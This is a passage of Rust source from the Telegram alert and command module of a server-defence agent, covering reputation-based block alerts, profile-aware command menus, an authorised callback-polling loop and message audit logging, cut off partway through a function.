    pub async fn send_abuseipdb_autoblock(
        &self,
        ip: &str,
        score: u8,
        threshold: u8,
        total_reports: u32,
        country: Option<&str>,
        isp: Option<&str>,
        incident_title: &str,
        dry_run: bool,
        dashboard_url: Option<&str>,
    ) -> Result<()> {
        let country_flag = country
            .map(|c| format!(" {} ·", country_flag_emoji(c)))
            .unwrap_or_default();
        let isp_line = isp
            .map(|i| format!(" · <i>{}</i>", escape_html(i)))
            .unwrap_or_default();
        let reports_line = if total_reports > 0 {
            format!(" · {} reports worldwide", total_reports)
        } else {
            String::new()
        };

        // 2026-05-08 (fix/abuseipdb-telegram-honesty): tier the copy by
        // observed score so the alert text matches the data the operator
        // reads in the same message. AbuseIPDB confidence ranges 0-100;
        // their own UI labels 0-24 as "low risk", 25-49 "medium",
        // 50-74 "high", 75-100 "very high / known malicious". The
        // pre-fix copy hard-coded "known threat" / "known bad actor" for
        // every score, which made a Score 8/100 + 3 reports + AWS-IRE
        // hit (operator's prod 2026-05-07) read like the agent was
        // calling AWS infrastructure a "known threat" — actively
        // damaging the operator's trust in every alert that follows.
        // We keep the alert firing (the operator may have legitimately
        // chosen `auto_block_threshold = 1`), but the copy now tells
        // the truth about how well-evidenced the block is.
        let tier = reputation_tier_label(score);
        let header_label = if dry_run {
            "🧪 <b>Dry-run</b> - "
        } else {
            "🛡 <b>Instant kill</b> - "
        };
        let header = format!("{header_label}{tier}");

        let action_line = if dry_run {
            format!(
                "Would've dropped <code>{}</code> - dry-run, standing down.",
                escape_html(ip)
            )
        } else {
            // The copy mentions both the threshold the operator chose
            // AND the score the IP earned, so the journal entry is
            // self-explanatory when the operator reviews it later.
            format!(
                "Blocked <code>{}</code> - {} (score {} ≥ threshold {}).",
                escape_html(ip),
                reputation_action_phrase(score),
                score,
                threshold,
            )
        };

        let score_bar = reputation_score_bar(score);

        // Footer was previously `Score ≥ {threshold} - handled before
        // AI analysis.` but the new `action_line` already states the
        // score-vs-threshold relationship. Keeping only the routing
        // hint ("handled before AI analysis") so the operator knows
        // why no AI verdict will appear in the dashboard for this IP.
        let text = format!(
            "{header}\n\
             \n\
             🌐{country_flag} <code>{ip}</code>{isp_line}\n\
             📊 Score: <b>{score}/100</b> {score_bar}{reports_line}\n\
             🔍 <i>{incident_title}</i>\n\
             \n\
             {action_line}\n\
             <i>Reputation gate ran before AI analysis.</i>",
            ip = escape_html(ip),
            incident_title = escape_html(incident_title),
        );

        let mut body = serde_json::json!({
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": true,
        });

        // Deep-link to dashboard journey for this IP
        if let Some(base_url) = dashboard_url {
            let today = chrono::Utc::now().format("%Y-%m-%d");
            body["reply_markup"] = serde_json::json!({
                "inline_keyboard": [[{
                    "text": "🔍 View threat timeline",
                    "url": format!("{base_url}/?subject_type=ip&subject={ip}&date={today}", ip = ip)
                }]]
            });
        }

        self.post_json("sendMessage", &body).await
    }

    // T.3 - Daily digest
    // -----------------------------------------------------------------------

    /// Send a plain HTML text message (used for daily digest).
    pub async fn send_text_message(&self, text: &str) -> Result<()> {
        let body = serde_json::json!({
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": true,
        });
        self.post_json("sendMessage", &body).await
    }

    /// Send an HTML message with an inline keyboard.
    pub async fn send_text_with_keyboard(
        &self,
        text: &str,
        keyboard: serde_json::Value,
    ) -> Result<()> {
        let body = serde_json::json!({
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": true,
            "reply_markup": { "inline_keyboard": keyboard },
        });
        self.post_json("sendMessage", &body).await
    }

    /// Send the interactive menu with inline keyboard buttons.
    pub async fn send_menu(&self, is_simple: bool) -> Result<()> {
        let profile_btn = if is_simple {
            serde_json::json!({ "text": "🔧 Switch to Technical", "callback_data": "profile:technical" })
        } else {
            serde_json::json!({ "text": "✨ Switch to Simple", "callback_data": "profile:simple" })
        };

        let body = serde_json::json!({
            "chat_id": self.chat_id,
            "text": "👾 <b>InnerWarden</b> - what do you need?",
            "parse_mode": "HTML",
            "reply_markup": {
                "inline_keyboard": [
                    [
                        { "text": "📊 Status",    "callback_data": "menu:status"    },
                        { "text": "🚨 Threats",   "callback_data": "menu:threats"   }
                    ],
                    [
                        { "text": "⚖️ Decisions", "callback_data": "menu:decisions" },
                        { "text": "\u{1f5d1}\u{fe0f} Undo", "callback_data": "menu:undo" }
                    ],
                    [
                        { "text": "❓ Help",       "callback_data": "menu:help"      }
                    ],
                    [ profile_btn ]
                ]
            }
        });
        self.post_json("sendMessage", &body).await
    }

    /// React to a message with 👀 (processing indicator).
    pub async fn react_eyes(&self, chat_id: i64, message_id: i64) {
        self.react(chat_id, message_id, "👀").await;
    }

    /// React to a message with an arbitrary emoji.
    pub async fn react(&self, chat_id: i64, message_id: i64, emoji: &str) {
        let body = serde_json::json!({
            "chat_id": chat_id,
            "message_id": message_id,
            "reaction": [{ "type": "emoji", "emoji": emoji }]
        });
        let _ = self.post_json("setMessageReaction", &body).await;
    }

    /// Show "typing..." indicator in the chat.
    pub async fn send_typing(&self) {
        let body = serde_json::json!({
            "chat_id": self.chat_id,
            "action": "typing"
        });
        let _ = self.post_json("sendChatAction", &body).await;
    }

    /// Register the bot's persistent command menu (shown in the text input).
    /// Called once at startup.
    /// Register the bot's persistent command menu, PROFILE-AWARE so a
    /// non-technical operator (the "simple" profile) sees a tiny, obvious set
    /// and is never confronted with admin jargon, while the technical profile
    /// gets the full control surface. The audit found a flat 13-command menu
    /// (with the lie-by-button /guard + /watch) was the main "confunde o
    /// usuário" problem; this is the de-clutter. /guard + /watch are dropped
    /// from the menu in favour of the actuating /mode (both still work if typed
    /// for back-compat). `simple` comes from `cfg.telegram.is_simple_profile()`.
    pub async fn set_commands(&self, simple: bool) {
        let body = serde_json::json!({ "commands": Self::command_menu(simple) });
        let _ = self.post_json("setMyCommands", &body).await;
    }

    /// The profile-aware command list (pure, so it is unit-testable). Lay menu =
    /// 5 plain commands; technical menu = the 11-command control surface. Neither
    /// carries the dropped lie-by-button /guard or /watch (replaced by /mode).
    fn command_menu(simple: bool) -> serde_json::Value {
        if simple {
            serde_json::json!([
                { "command": "status",  "description": "Is my server safe right now?" },
                { "command": "threats", "description": "Who tried to attack, and what I did" },
                { "command": "mode",    "description": "Turn auto-defend on or off" },
                { "command": "ask",     "description": "Ask me anything about your server" },
                { "command": "help",    "description": "What I can do" }
            ])
        } else {
            serde_json::json!([
                { "command": "status",       "description": "Guardian status: mode, AI, threat intel" },
                { "command": "threats",      "description": "Recent intrusion attempts" },
                { "command": "decisions",    "description": "Actions I've taken" },
                { "command": "blocked",      "description": "Threat actors currently contained" },
                { "command": "posture",      "description": "Live host posture: sshd, sudo, firewall" },
                { "command": "mode",         "description": "Set defend mode: guard, watch, dryrun" },
                { "command": "capabilities", "description": "List capabilities and their status" },
                { "command": "doctor",       "description": "Full health check with fix hints" },
                { "command": "ask",          "description": "Ask about config, incidents, posture" },
                { "command": "undo",         "description": "Undo recent allowlist additions" },
                { "command": "help",         "description": "Operator command playbook" }
            ])
        }
    }

    // -----------------------------------------------------------------------
    // Polling loop (background task)
    // -----------------------------------------------------------------------

    /// Polls Telegram for updates and sends ApprovalResults to `approval_tx`.
    /// Designed to run as a background tokio task - exits when `approval_tx` is closed.
    ///
    /// Uses long-polling (timeout=25s) so this blocks for up to 25s between updates.
    /// Any errors are logged and the loop continues.
    /// Inbound authorization (spec 067 Phase 1): only the configured operator
    /// chat may drive the bot. Before this gate the poll loop processed ANY
    /// sender's commands, `/ask` (LLM access + graph-context disclosure),
    /// `/enable` / `/disable` (CLI subprocess), and approval callbacks — there
    /// was no inbound check on who sent the update.
    ///
    /// Telegram chat ids are always `i64`. When the configured `chat_id` is a
    /// numeric id (every real deployment) the sender's chat id MUST equal it or
    /// the update is dropped.
    ///
    /// FAIL CLOSED: a non-numeric configured chat_id (a placeholder, a typo, an
    /// unset env var) cannot be matched against an `i64` sender, so we drop ALL
    /// updates rather than authorising every sender. Privileged commands now
    /// reach root (`/enable`, `/disable`) and flip enforcement (`/mode`); a
    /// misconfigured id must never become an open door. (A bot whose id is
    /// non-numeric also cannot send outbound, so failing closed only makes an
    /// already-broken bot inert, never less safe.)
    fn inbound_authorized(&self, chat_id: i64) -> bool {
        match self.chat_id.parse::<i64>() {
            Ok(allowed) => allowed == chat_id,
            Err(_) => false,
        }
    }

    pub async fn run_polling(
        self: std::sync::Arc<Self>,
        approval_tx: mpsc::Sender<ApprovalResult>,
    ) {
        let mut offset: i64 = 0;

        loop {
            if approval_tx.is_closed() {
                break;
            }

            match self.get_updates(offset).await {
                Ok(updates) => {
                    if !updates.is_empty() {
                        info!(count = updates.len(), offset, "Telegram: received updates");
                    }
                    for update in updates {
                        offset = update.update_id + 1;

                        if let Some(callback) = update.callback_query {
                            let operator = callback
                                .from
                                .first_name
                                .clone()
                                .unwrap_or_else(|| "unknown".to_string());

                            // Extract chat_id + message_id for emoji reactions
                            let cb_chat_id = callback
                                .message
                                .as_ref()
                                .and_then(|m| m.chat.as_ref())
                                .map(|c| c.id)
                                .unwrap_or(0);
                            let cb_msg_id =
                                callback.message.as_ref().map(|m| m.message_id).unwrap_or(0);

                            // Spec 067 Phase 1: drop callbacks from any chat that
                            // is not the configured operator chat.
                            if !self.inbound_authorized(cb_chat_id) {
                                warn!(
                                    chat_id = cb_chat_id,
                                    operator = %operator,
                                    "Telegram: dropping callback from unauthorized chat"
                                );
                                continue;
                            }

                            if let Some(data) = &callback.data {
                                if let Some(incident_id) = data.strip_prefix("fp:check:") {
                                    // Dev mode: log incident as potential false positive
                                    let ts = chrono::Utc::now().format("%Y-%m-%dT%H:%M:%SZ");
                                    let entry = format!(
                                        "{{\"ts\":\"{ts}\",\"incident_id\":\"{incident_id}\",\"operator\":\"{operator}\",\"action\":\"check_fp\"}}\n"
                                    );
                                    // Write to false-positive review log
                                    // Write to data dir or fallback to /tmp
                                    let fp_path = {
                                        let primary = std::path::PathBuf::from(
                                            "/var/lib/innerwarden/fp-review.jsonl",
                                        );
                                        if primary.parent().map(|p| p.exists()).unwrap_or(false) {
                                            primary
                                        } else {
                                            std::path::PathBuf::from(
                                                "/tmp/innerwarden-fp-review.jsonl",
                                            )
                                        }
                                    };
                                    match std::fs::OpenOptions::new()
                                        .create(true)
                                        .append(true)
                                        .open(&fp_path)
                                    {
                                        Ok(mut f) => {
                                            use std::io::Write;
                                            let _ = f.write_all(entry.as_bytes());
                                            info!(incident_id, operator = %operator, path = %fp_path.display(), "FP review: incident flagged for review");
                                        }
                                        Err(e) => {
                                            warn!(error = %e, "FP review: failed to write log")
                                        }
                                    }
                                    let _ = self
                                        .answer_callback_toast(
                                            &callback.id,
                                            &format!(
                                                "\u{1f52c} Flagged for FP review: {}",
                                                &incident_id[..incident_id.len().min(40)]
                                            ),
                                        )
                                        .await;
                                    if cb_chat_id != 0 {
                                        self.react(cb_chat_id, cb_msg_id, "\u{1f4dd}").await;
                                    }
                                } else if let Some(detector) = data.strip_prefix("explain:") {
                                    // Simple profile: send a longer explanation of the detector
                                    let explanation = explain_detector(detector);
                                    let _ = self.answer_callback(&callback.id).await;
                                    let _ = self.send_raw_html(&explanation).await;
                                    if cb_chat_id != 0 {
                                        self.react(cb_chat_id, cb_msg_id, "\u{1f4a1}").await;
                                    }
                                } else if let Some(id) = data.strip_prefix("quick:ignore:") {
                                    // Record a REAL false-positive signal: route the
                                    // incident through __fp__ exactly like the fp:
                                    // button so the feedback tracker learns from it.
                                    // The toast only claims "logged" because it now is.
                                    let _ = self
                                        .answer_callback_toast(
                                            &callback.id,
                                            "👍 Logged as false positive. Keeping eyes on it.",
                                        )
                                        .await;
                                    if cb_chat_id != 0 {
                                        self.react(cb_chat_id, cb_msg_id, "\u{1f44d}").await;
                                    }
                                    let result = ApprovalResult {
                                        incident_id: format!("__fp__:{id}"),
                                        approved: true,
                                        always: false,
                                        operator_name: operator.clone(),
                                        chosen_action: String::new(),
                                    };
                                    if approval_tx.send(result).await.is_err() {
                                        return;
                                    }
                                } else if data == "quick:ignore" {
                                    // Legacy button (pre-id, still in old chat history):
                                    // no incident id to attribute, so do NOT claim it
                                    // was logged. Just dismiss honestly.
                                    let _ = self
                                        .answer_callback_toast(
                                            &callback.id,
                                            "👍 Dismissed. I'll keep watching.",
                                        )
                                        .await;
                                    if cb_chat_id != 0 {
                                        self.react(cb_chat_id, cb_msg_id, "\u{1f44d}").await;
                                    }
                                } else if let Some(ip_str) = data.strip_prefix("quick:block:") {
                                    // Validate IP format before processing
                                    if ip_str.parse::<std::net::IpAddr>().is_ok() {
                                        let ip = ip_str.to_string();
                                        let _ = self
                                            .answer_callback_toast(
                                                &callback.id,
                                                &format!("🛡 Dropping {ip} at the firewall..."),
                                            )
                                            .await;
                                        if cb_chat_id != 0 {
                                            self.react(cb_chat_id, cb_msg_id, "\u{1f6e1}\u{fe0f}")
                                                .await;
                                        }
                                        let result = ApprovalResult {
                                            incident_id: format!("__quick_block__:{ip}"),
                                            approved: true,
                                            always: false,
                                            operator_name: operator.clone(),
                                            chosen_action: String::new(),
                                        };
                                        if approval_tx.send(result).await.is_err() {
                                            return;
                                        }
                                    } else {
                                        warn!(callback_data = %data, "invalid IP in Telegram callback, ignoring");
                                    }
                                } else if let Some(rest) = data.strip_prefix("hpot:") {
                                    // Honeypot operator-in-the-loop choice
                                    // format: "hpot:{action}:{ip}"
                                    let parts: Vec<&str> = rest.splitn(2, ':').collect();
                                    if parts.len() == 2 {
                                        let action = parts[0];
                                        let ip = parts[1];
                                        let toast = match action {
                                            "honeypot" => {
                                                format!("🍯 Routing {ip} to honeypot - let them think they're in...")
                                            }
                                            "block" => {
                                                format!("🚫 Dropping {ip} at the firewall...")
                                            }
                                            "monitor" => {
                                                format!("👁 Silent monitoring on {ip} - collecting intel...")
                                            }
                                            _ => "👍 Logged.".to_string(),
                                        };
                                        let _ =
                                            self.answer_callback_toast(&callback.id, &toast).await;
                                        if cb_chat_id != 0 {
                                            let emoji = match action {
                                                "honeypot" => "\u{1f36f}",
                                                "block" => "\u{1f6ab}",
                                                "monitor" => "\u{1f441}\u{fe0f}",
                                                _ => "\u{1f44d}",
                                            };
                                            self.react(cb_chat_id, cb_msg_id, emoji).await;
                                        }
                                        let result = ApprovalResult {
                                            incident_id: format!("__hpot__:{ip}"),
                                            approved: action != "ignore",
                                            always: false,
                                            operator_name: operator.clone(),
                                            chosen_action: action.to_string(),
                                        };
                                        if approval_tx.send(result).await.is_err() {
                                            return;
                                        }
                                    }
                                } else if let Some(rest) = data.strip_prefix("review:") {
                                    // Spec 062 Phase 3: needs_review operator decision.
                                    // format: "review:{action}:{incident_id}" where
                                    // action ∈ {block, ignore, dismiss}. The incident_id
                                    // itself can contain ':' (e.g. "kill_chain:1.2.3.4"),
                                    // so split only on the FIRST ':' after the action.
                                    let parts: Vec<&str> = rest.splitn(2, ':').collect();
                                    if parts.len() == 2 {
                                        let action = parts[0];
                                        let incident_id = parts[1];
                                        let toast = Self::review_action_toast(action);
                                        let _ =
                                            self.answer_callback_toast(&callback.id, &toast).await;
                                        if cb_chat_id != 0 {
                                            let emoji = Self::review_action_emoji(action);
                                            self.react(cb_chat_id, cb_msg_id, emoji).await;
                                        }
                                        let result = ApprovalResult {
                                            incident_id: format!("__review__:{incident_id}"),
                                            approved: action != "ignore",
                                            always: false,
                                            operator_name: operator.clone(),
                                            chosen_action: action.to_string(),
                                        };
                                        if approval_tx.send(result).await.is_err() {
                                            return;
                                        }
                                    }
                                } else if let Some(rest) = data.strip_prefix("allow:proc:") {
                                    let _ = self
                                        .answer_callback_toast(
                                            &callback.id,
                                            &format!("\u{2705} Adding {} to allowlist...", rest),
                                        )
                                        .await;
                                    if cb_chat_id != 0 {
                                        self.react(cb_chat_id, cb_msg_id, "\u{2705}").await;
                                    }
                                    let result = ApprovalResult {
                                        incident_id: format!("__allow_proc__:{rest}"),
                                        approved: true,
                                        always: false,
                                        operator_name: operator.clone(),
                                        chosen_action: String::new(),
                                    };
                                    if approval_tx.send(result).await.is_err() {
                                        return;
                                    }
                                } else if let Some(rest) = data.strip_prefix("allow:ip:") {
                                    let _ = self
                                        .answer_callback_toast(
                                            &callback.id,
                                            &format!("\u{2705} Adding {} to allowlist...", rest),
                                        )
                                        .await;
                                    if cb_chat_id != 0 {
                                        self.react(cb_chat_id, cb_msg_id, "\u{2705}").await;
                                    }
                                    let result = ApprovalResult {
                                        incident_id: format!("__allow_ip__:{rest}"),
                                        approved: true,
                                        always: false,
                                        operator_name: operator.clone(),
                                        chosen_action: String::new(),
                                    };
                                    if approval_tx.send(result).await.is_err() {
                                        return;
                                    }
                                } else if !data.starts_with("fp:check:") && data.starts_with("fp:")
                                {
                                    // Triage FP report (not the dev-mode fp:check: handler)
                                    let rest = &data[3..];
                                    let _ = self
                                        .answer_callback_toast(
                                            &callback.id,
                                            "\u{1f4dd} Reported as false positive. Thanks!",
                                        )
                                        .await;
                                    if cb_chat_id != 0 {
                                        self.react(cb_chat_id, cb_msg_id, "\u{1f4dd}").await;
                                    }
                                    let result = ApprovalResult {
                                        incident_id: format!("__fp__:{rest}"),
                                        approved: true,
                                        always: false,
                                        operator_name: operator.clone(),
                                        chosen_action: String::new(),
                                    };
                                    if approval_tx.send(result).await.is_err() {
                                        return;
                                    }
                                } else if let Some(rest) = data.strip_prefix("autofp:") {
                                    // Auto-FP suggestion: "autofp:yes:proc:name" or "autofp:no:name"
                                    let toast = if rest.starts_with("yes:") {
                                        "\u{2705} Adding to allowlist..."
                                    } else {
                                        "\u{1f440} OK, will keep monitoring."
                                    };
                                    let _ = self.answer_callback_toast(&callback.id, toast).await;
                                    let result = ApprovalResult {
                                        incident_id: format!("__autofp__:{rest}"),
                                        approved: true,
                                        always: false,
                                        operator_name: operator.clone(),
                                        chosen_action: String::new(),
                                    };
                                    if approval_tx.send(result).await.is_err() {
                                        return;
                                    }
                                } else if let Some(rest) = data.strip_prefix("undo:") {
                                    // Undo allowlist: "undo:proc:key" or "undo:ip:key"
                                    let _ = self
                                        .answer_callback_toast(
                                            &callback.id,
                                            "\u{1f5d1}\u{fe0f} Removing from allowlist...",
                                        )
                                        .await;
                                    let result = ApprovalResult {
                                        incident_id: format!("__undo__:{rest}"),
                                        approved: true,
                                        always: false,
                                        operator_name: operator.clone(),
                                        chosen_action: String::new(),
                                    };
                                    if approval_tx.send(result).await.is_err() {
                                        return;
                                    }
                                } else if data == "enable2fa" {
                                    let _ = self
                                        .answer_callback_toast(
                                            &callback.id,
                                            "\u{1f510} 2FA setup instructions sent.",
                                        )
                                        .await;
                                    let result = ApprovalResult {
                                        incident_id: "__enable2fa__".to_string(),
                                        approved: true,
                                        always: false,
                                        operator_name: operator.clone(),
                                        chosen_action: String::new(),
                                    };
                                    if approval_tx.send(result).await.is_err() {
                                        return;
                                    }
                                } else if data == "dismiss2fa" {
                                    let _ = self
                                        .answer_callback_toast(&callback.id, "\u{1f44d} Dismissed.")
                                        .await;
                                    // No routing needed, just ack
                                } else {
                                    // Answer the callback immediately to remove the spinner
                                    let _ = self.answer_callback(&callback.id).await;
                                    if let Some(result) = parse_callback(data, &operator) {
                                        if approval_tx.send(result).await.is_err() {
                                            return;
                                        }
                                    }
                                }
                            }
                        }

                        // Handle text commands and free-form messages
                        if let Some(msg) = update.message {
                            if let Some(raw_text) = &msg.text {
                                // Strip @BotUsername suffix that Telegram appends
                                // (e.g. "/help@InnerWardenBot" → "/help")
                                let text = strip_bot_suffix(raw_text.trim());
                                let operator = msg
                                    .from
                                    .as_ref()
                                    .and_then(|f| f.first_name.clone())
                                    .unwrap_or_default();
                                info!(text = %text, operator = %operator, "Telegram: text message received");

                                // Spec 067 Phase 1: drop messages from any chat
                                // that is not the configured operator chat,
                                // before any reaction, AI call, or command runs.
                                let chat_id = msg.chat.as_ref().map(|c| c.id).unwrap_or(0);
                                if !self.inbound_authorized(chat_id) {
                                    warn!(
                                        chat_id,
                                        operator = %operator,
                                        "Telegram: dropping message from unauthorized sender"
                                    );
                                    continue;
                                }

                                // Visual feedback: react with 👀 and show typing
                                if chat_id != 0 {
                                    self.react_eyes(chat_id, msg.message_id).await;
                                }
                                self.send_typing().await;

                                let incident_id = if text == "/status"
                                    || text.starts_with("/status ")
                                {
                                    info!("Telegram: routing /status command");
                                    "__status__".to_string()
                                } else if text == "/help" || text.starts_with("/help ") {
                                    "__help__".to_string()
                                } else if text == "/menu" || text.starts_with("/menu ") {
                                    "__menu__".to_string()
                                } else if text == "/incidents"
                                    || text.starts_with("/incidents ")
                                    || text == "/threats"
                                    || text.starts_with("/threats ")
                                {
                                    "__threats__".to_string()
                                } else if text == "/decisions" || text.starts_with("/decisions ") {
                                    "__decisions__".to_string()
                                } else if text == "/blocked" || text.starts_with("/blocked ") {
                                    "__blocked__".to_string()
                                } else if text == "/mode" {
                                    // Bare /mode → show current mode + options.
                                    "__mode__:".to_string()
                                } else if let Some(m) = text.strip_prefix("/mode ") {
                                    // /mode guard|watch|dryrun → live mode change.
                                    format!("__mode__:{m}")
                                } else if text == "/unblock" {
                                    "__unblock__:".to_string()
                                } else if let Some(ip) = text.strip_prefix("/unblock ") {
                                    // /unblock <ip> → reverse a containment (2FA).
                                    format!("__unblock__:{ip}")
                                } else if text == "/guard" || text.starts_with("/guard ") {
                                    "__guard__".to_string()
                                } else if text == "/watch" || text.starts_with("/watch ") {
                                    "__watch__".to_string()
                                } else if text == "/doctor" || text.starts_with("/doctor ") {
                                    "__doctor__".to_string()
                                } else if text == "/posture" || text.starts_with("/posture ") {
                                    // Spec 044 Phase 4: prints the live host
                                    // posture snapshot the downgrade engine
                                    // reads. Format mirrors `innerwarden get
                                    // posture` but as Telegram HTML.
                                    "__posture__".to_string()
                                } else if text == "/capabilities"
                                    || text.starts_with("/capabilities ")
                                    || text == "/list"
                                    || text.starts_with("/list ")
                                {
                                    "__capabilities__".to_string()
                                } else if text == "/enable" || text == "/disable" {
                                    // Bare command with no capability argument: reply
                                    // with usage instead of the generic "unknown
                                    // command" hint (which makes the user feel they
                                    // broke it). strip_prefix below needs the arg.
                                    "__cap_usage__".to_string()
                                } else if let Some(cap) = text.strip_prefix("/enable ") {
                                    format!("__enable__:{cap}")
                                } else if let Some(cap) = text.strip_prefix("/disable ") {
                                    format!("__disable__:{cap}")
                                } else if text == "/undo" || text.starts_with("/undo ") {
                                    "__undo__".to_string()
                                } else if text == "/start" || text.starts_with("/start ") {
                                    // Telegram sends /start when user first opens the bot
                                    "__start__".to_string()
                                } else if !text.starts_with('/') || text.starts_with("/ask ") {
                                    // Free-form text or /ask <question> - route to AI
                                    let question =
                                        text.strip_prefix("/ask ").unwrap_or(&text).to_string();
                                    format!("__ask__:{question}")
                                } else {
                                    // Unknown command - send help hint
                                    "__unknown_cmd__".to_string()
                                };

                                let _ = approval_tx
                                    .send(ApprovalResult {
                                        incident_id,
                                        approved: true,
                                        always: false,
                                        operator_name: operator,
                                        chosen_action: String::new(),
                                    })
                                    .await;
                            }
                        }
                    }
                }
                Err(e) => {
                    warn!("Telegram poll error: {e:#}");
                    tokio::time::sleep(Duration::from_secs(5)).await;
                }
            }
        }
    }

    // -----------------------------------------------------------------------
    // Low-level API calls
    // -----------------------------------------------------------------------

    async fn get_updates(&self, offset: i64) -> Result<Vec<Update>> {
        // Spec 024 mock path: scenario runs must never long-poll real Telegram.
        // Sleep briefly so the caller's loop doesn't spin, then return empty.
        if self.mock_outbox.is_some() {
            let _ = offset;
            tokio::time::sleep(Duration::from_millis(100)).await;
            return Ok(Vec::new());
        }
        let url = self.api_url("getUpdates");
        let resp = self
            .http
            .get(&url)
            .query(&[
                ("offset", offset.to_string()),
                ("timeout", "25".to_string()),
                (
                    "allowed_updates",
                    r#"["message","callback_query"]"#.to_string(),
                ),
            ])
            .send()
            .await
            .with_context(|| format!("getUpdates request failed ({})", sanitize_url(&url)))?
            .json::<serde_json::Value>()
            .await
            .with_context(|| format!("getUpdates JSON parse failed ({})", sanitize_url(&url)))?;

        if !resp["ok"].as_bool().unwrap_or(false) {
            let desc = resp["description"].as_str().unwrap_or("unknown error");
            warn!("Telegram getUpdates error: {desc}");
            return Ok(vec![]);
        }

        let raw_result = resp["result"].clone();
        let result_count = raw_result.as_array().map(|a| a.len()).unwrap_or(0);
        let updates: Vec<Update> = match serde_json::from_value(raw_result) {
            Ok(u) => u,
            Err(e) => {
                warn!(error = %e, raw_count = result_count, "Telegram: failed to deserialize updates");
                vec![]
            }
        };
        Ok(updates)
    }

    async fn answer_callback(&self, callback_query_id: &str) -> Result<()> {
        let body = serde_json::json!({ "callback_query_id": callback_query_id });
        self.post_json("answerCallbackQuery", &body).await
    }

    async fn answer_callback_toast(&self, callback_query_id: &str, text: &str) -> Result<()> {
        let body = serde_json::json!({
            "callback_query_id": callback_query_id,
            "text": text,
            "show_alert": false
        });
        self.post_json("answerCallbackQuery", &body).await
    }

    async fn post_json(&self, method: &str, body: &serde_json::Value) -> Result<()> {
        self.post_json_with_response(method, body).await?;
        Ok(())
    }

    async fn post_json_with_response(
        &self,
        method: &str,
        body: &serde_json::Value,
    ) -> Result<serde_json::Value> {
        // Audit log: record every outgoing Telegram message for
        // debugging notification noise. Two sinks:
        //   1. journald via `target: "telegram_audit"` (env_filter
        //      includes this target as of 2026-05-01).
        //   2. persistent JSONL at `data_dir/telegram-sent.jsonl` so
        //      the trail survives log rotation. Append-only, fail-
        //      open: a write failure logs a warn but does NOT abort
        //      the actual send.
        if method == "sendMessage" {
            let text_preview = body["text"]
                .as_str()
                .unwrap_or("")
                .chars()
                .take(120)
                .collect::<String>()
                .replace('\n', " ");
            info!(
                target: "telegram_audit",
                method = method,
                text_preview = %text_preview,
                "Telegram outgoing message"
            );
            if let Some(path) = &self.audit_jsonl {
                let record = serde_json::json!({
                    "ts": chrono::Utc::now().to_rfc3339(),
                    "method": method,
                    "chat_id": self.chat_id,
                    "text_preview": text_preview,
                    // The full text is captured too. The dashboard
                    // audit view truncates display; consumers that
                    // need length stats read from this field.
                    "text": body["text"].as_str().unwrap_or(""),
                    "has_keyboard": body.get("reply_markup").is_some(),
                });
                if let Err(e) = append_jsonl_line(path, &record) {
                    warn!(
                        path = %path.display(),
                        error = %e,
                        "telegram audit jsonl write failed (non-fatal — send proceeds)"
                    );
                }
            }
        }

        // Enforce message length limit on outgoing text
        let body = if let Some(text) = body["text"].as_str() {
            let safe_text = enforce_length(text);
            let mut patched = body.clone();
            patched["text"] = serde_json::Value::String(safe_text);
            patched
        } else {
            body.clone()
        };

        // Spec 024 mock path: when the env-gated outbox is set, persist the
        // call as a JSONL line and return a stubbed success response instead
        // of performing any HTTP work. No rate limiter, no network — the
        // scenario harness treats this file as the authoritative record of
        // everything the agent would have sent.
        if let Some(outbox) = &self.mock_outbox {
            let text_snapshot = body["text"].as_str().unwrap_or("").to_string();
            let record = serde_json::json!({
                "ts": chrono::Utc::now().to_rfc3339(),
                "method": method,
                "text": text_snapshot,
                "body": body,
            });
            let line = record.to_string();
            match std::fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(outbox)
            {
                Ok(mut f) => {
                    use std::io::Write;
                    if let Err(e) = writeln!(f, "{line}") {
                        warn!(path = %outbox.display(), "mock telegram outbox write failed: {e}");
                    }
                }
                Err(e) => {
                    warn!(path = %outbox.display(), "mock telegram outbox open failed: {e}");
                }
            }
            return Ok(serde_json::json!({
                "ok": true,
                "result": { "message_id": 1 }
            }));
        }

        // Rate limiter: ~20 msg/sec, well within Telegram's 30/sec limit
        {
            let mut last = self.last_send.lock().await;
            let elapsed = last.elapsed();
            if elapsed < Duration::from_millis(50) {
                tokio::time::sleep(Duration::from_millis(50) - elapsed).await;
            }
            *last = tokio::time::Instant::now();
        }

        let url = self.api_url(method);
        // 2026-05-01: capture send failures into telegram-failed.jsonl
        // before propagating the error. Three failure modes are caught:
        //   1. HTTP transport failure (network, TLS, timeout)
        //   2. Response body not valid JSON
        //   3. Telegram API returns ok=false (rate limit, bad token,
        //      chat not found, etc.)
        // Each writes one record so the operator can audit "what was
        // meant to send but didn't" without scraping journald.
        let raw_resp = match self.http.post(&url).json(&body).send().await {
            Ok(r) => r,
            Err(e) => {
                self.audit_failed_send(method, &body, &format!("http error: {e}"));
                return Err(anyhow::Error::new(e)
                    .context(format!("Telegram {method} failed ({})", sanitize_url(&url))));
            }
        };
        let resp = match raw_resp.json::<serde_json::Value>().await {
            Ok(v) => v,
            Err(e) => {
                self.audit_failed_send(method, &body, &format!("json parse error: {e}"));
                return Err(anyhow::Error::new(e).context(format!(
                    "Telegram {method} JSON parse failed ({})",
                    sanitize_url(&url)
                )));
            }
        };

        if !resp["ok"].as_bool().unwrap_or(false) {
            let desc = resp["description"]
                .as_str()
                .unwrap_or("unknown Telegram error");
            warn!(method, url = %sanitize_url(&url), "Telegram API error: {desc}");
            self.audit_failed_send(method, &body, &format!("api ok=false: {desc}"));
        } else if method == "sendMessage" {
            if let Some(counter) = &self.telegram_sent_counter {
                counter.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            }
        }

        Ok(resp)
    }

    /// Append a failed-send record to `data_dir/telegram-failed.jsonl`.
    /// Best-effort; a write failure here logs WARN but does not
    /// propagate (the call already failed for a different reason and
    /// hiding that reason behind a logging failure helps no one).
    fn audit_failed_send(&self, method: &str, body: &serde_json::Value, error: &str) {
        let Some(path) = &self.failed_jsonl else {
            return;
        };
        if method != "sendMessage" {
            // Only sendMessage failures are operator-visible; don't
            // pollute the file with reaction / poll / typing errors.
            return;
        }
        let text = body["text"].as_str().unwrap_or("");
        let record = serde_json::json!({
            "ts": chrono::Utc::now().to_rfc3339(),
            "method": method,
